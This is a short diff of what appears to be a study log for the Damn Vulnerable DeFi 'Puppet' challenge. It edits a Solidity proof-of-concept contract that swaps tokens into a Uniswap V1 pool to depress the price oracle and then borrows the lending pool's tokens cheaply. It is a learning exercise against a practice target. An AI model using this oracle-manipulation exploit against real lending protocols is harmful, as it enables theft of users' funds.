@@ -687,7 +687,6 @@ contract PuppetPool is ReentrancyGuard {
 
 POC:
 
-```
 contract CallPuppet{
     DamnValuableToken token;
     PuppetPool lendingPool;
@@ -699,7 +698,8 @@ contract CallPuppet{
     function start(address recovery,address unipool)public payable{
         // payable(unipool).call{value:24*1e18}("");
         token.approve(unipool, 1e5*1e18);
-        IUniswapV1Exchange(unipool).tokenToEthSwapInput(token.balanceOf(address(this)), 0,block.timestamp+1 days);
+        // token.transfer(address(lendingPool), token.balanceOf(address(this)));
+        IUniswapV1Exchange(unipool).tokenToEthSwapInput(9e20, 1, block.timestamp+1 days);
         uint amount = lendingPool.calculateDepositRequired(1e5*1e18);
         console.logUint(amount);
         lendingPool.borrow{value:address(this).balance}(1e5*1e18,recovery);
@@ -708,7 +708,6 @@ contract CallPuppet{
 
     }
 }
-```
 
 
 ### 2024.09.06
